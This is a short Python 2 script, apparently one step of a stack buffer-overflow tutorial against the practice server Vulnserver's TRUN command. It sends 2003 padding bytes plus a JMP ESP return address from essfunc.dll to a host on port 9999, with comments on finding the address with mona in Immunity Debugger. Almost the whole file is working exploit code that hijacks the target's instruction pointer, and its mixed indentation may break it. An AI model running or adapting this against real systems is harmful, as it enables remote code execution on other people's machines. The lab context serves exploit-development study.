#!/usr/bin/python 
import sys, socket


#download mona modules from github and paste into pycommands in immunity 
# use !mona modules to use this module and find out our program to verifiy the protections
#so our program is not having any protection so
# now we need to a jum esp  so start nasm_shell.rb  
# execute !mona find -s "\xff\xe4 -m essfunc.dll
#625011af  

shell = "A" * 2003 + "\xaf\x11\x50\x62" 

#make sure you found bad chars with the previous script with eip

#coz of litten endian formet we need to add these address into it the shell

#now after execution search the address into immunity and make sure you get jmp esp and set a break point on it to stop the program for our purpose

try: 
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
                                s.connect(( '192.168.31.146', 9999)) 
				
				s.send(( 'TRUN /.:/' + shell))  
				s.close()  
			     
except : 
				print "error in connection"
				sys.exit()
